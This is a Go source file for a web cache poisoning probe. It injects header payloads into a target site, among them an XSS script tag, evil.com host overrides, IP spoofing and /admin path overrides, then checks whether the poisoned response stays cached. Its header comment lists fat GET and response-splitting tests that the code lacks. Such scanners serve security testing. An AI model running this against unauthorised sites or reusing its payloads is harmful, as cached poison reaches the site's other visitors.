package main

/*
Cache Poison Detector — Fast web cache poisoning probe.

Tests common unkeyed headers for cache poisoning vulnerabilities:
  - X-Forwarded-Host → XSS / open redirect
  - X-Forwarded-Scheme → mixed content injection
  - X-Forwarded-For → response splitting
  - Origin → CORS misconfiguration
  - Fat GET poisoning

Usage:
  go run cache-poison.go -url https://target.com/page [-headers custom.txt]
*/

import (
	"crypto/rand"
	"crypto/tls"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"time"
)

var (
	targetURL  = flag.String("url", "", "Target URL to test")
	headerFile = flag.String("headers", "", "Custom header list (one per line)")
	timeout    = flag.Int("timeout", 10, "Request timeout in seconds")
	concurrent = flag.Int("concurrent", 5, "Concurrent probe count")
)

var defaultHeaders = []struct {
	name     string
	payload  string
	risk     string
}{
	{"X-Forwarded-Host", "evil.com", "XSS via script src"},
	{"X-Forwarded-Host", "evil.com\"><script>alert(1)</script>", "XSS injection"},
	{"X-Forwarded-Scheme", "http", "Mixed content injection"},
	{"X-Forwarded-For", "127.0.0.1", "IP spoofing"},
	{"X-Original-URL", "/admin", "Path override"},
	{"X-Rewrite-URL", "/admin", "Path override"},
	{"X-HTTP-Method-Override", "PUT", "Method override"},
	{"Origin", "https://evil.com", "CORS misconfig"},
	{"X-Host", "evil.com", "Host override"},
	{"Forwarded", "for=evil.com;host=evil.com", "Forwarded header"},
	{"X-Forwarded-Port", "8443", "Port override"},
	{"True-Client-IP", "127.0.0.1", "IP spoofing"},
	{"X-Real-IP", "127.0.0.1", "IP spoofing"},
	{"X-Client-IP", "127.0.0.1", "IP spoofing"},
}

type ProbeResult struct {
	Header     string
	Payload    string
	Risk       string
	Reflected  bool
	Cached     bool
}

func randStr() string {
	b := make([]byte, 6)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func probe(client *http.Client, url string, header, payload, risk string) ProbeResult {
	r := ProbeResult{Header: header, Payload: payload, Risk: risk}

	marker := "POISON-" + randStr()

	// Phase 1: Inject poison
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return r
	}
	req.Header.Set(header, payload+marker)

	resp, err := client.Do(req)
	if err != nil {
		return r
	}
	body1, _ := io.ReadAll(resp.Body)
	resp.Body.Close()

	if strings.Contains(string(body1), marker) {
		r.Reflected = true
	} else {
		// Check response headers for reflection
		for _, vals := range resp.Header {
			for _, v := range vals {
				if strings.Contains(v, marker) {
					r.Reflected = true
					break
				}
			}
		}
	}
	if r.Reflected && resp.Header.Get("X-Cache") == "" &&
		resp.Header.Get("CF-Cache-Status") == "" &&
		resp.Header.Get("Age") == "" {
		r.Reflected = false
	}
	// Phase 2: Verify cache persistence (unkeyed)
	time.Sleep(500 * time.Millisecond)
	req2, _ := http.NewRequest("GET", url, nil)
	resp2, err := client.Do(req2)
	if err != nil {
		return r
	}
	body2, _ := io.ReadAll(resp2.Body)
	resp2.Body.Close()

	if strings.Contains(string(body2), marker) {
		r.Cached = true
	}

	return r
}

func main() {
	flag.Parse()

	if *targetURL == "" {
		fmt.Println("Usage: cache-poison-detector -url https://target.com/page")
		flag.PrintDefaults()
		os.Exit(1)
	}

	client := &http.Client{
		Timeout: time.Duration(*timeout) * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	// Detect cache layer
	fmt.Printf("[*] Target: %s\n", *targetURL)
	fmt.Println("[*] Detecting cache layer...")

	resp, err := client.Head(*targetURL)
	if err != nil {
		fmt.Printf("[!] Failed to reach target: %v\n", err)
		os.Exit(1)
	}

	cacheHints := []string{}
	for _, h := range []string{"X-Cache", "CF-Cache-Status", "Age", "Via", "X-Served-By", "X-CDN"} {
		if v := resp.Header.Get(h); v != "" {
			cacheHints = append(cacheHints, fmt.Sprintf("%s: %s", h, v))
		}
	}
	if len(cacheHints) > 0 {
		fmt.Printf("[+] Cache detected: %s\n", strings.Join(cacheHints, ", "))
	} else {
		fmt.Println("[-] No obvious cache headers found (may still have caching)")
	}

	// Probe headers
	headers := defaultHeaders
	if *headerFile != "" {
		data, err := os.ReadFile(*headerFile)
		if err == nil {
			headers = nil
			for _, line := range strings.Split(string(data), "\n") {
				line = strings.TrimSpace(line)
				if line != "" && !strings.HasPrefix(line, "#") {
					headers = append(headers, struct {
						name    string
						payload string
						risk    string
					}{line, "custom", "custom"})
				}
			}
		}
	}

	fmt.Printf("[*] Probing %d headers...\n\n", len(headers))

	results := make(chan ProbeResult, len(headers))
	sem := make(chan bool, *concurrent)

	for _, h := range headers {
		sem <- true
		go func(header, payload, risk string) {
			defer func() { <-sem }()
			r := probe(client, *targetURL, header, payload, risk)
			results <- r
		}(h.name, h.payload, h.risk)
	}

	for i := 0; i < len(headers); i++ {
		r := <-results
		if r.Reflected && r.Cached {
			fmt.Printf("🚨 CRITICAL: %s\n", r.Header)
			fmt.Printf("   Payload: %s\n", r.Payload)
			fmt.Printf("   Risk: %s\n", r.Risk)
			fmt.Printf("   Cache-poisonable! Header is unkeyed.\n\n")
		} else if r.Reflected {
			fmt.Printf("⚠️  REFLECTED: %s (not cached — may be keyed)\n", r.Header)
		}
	}

	fmt.Println("\n[✓] Scan complete")
}
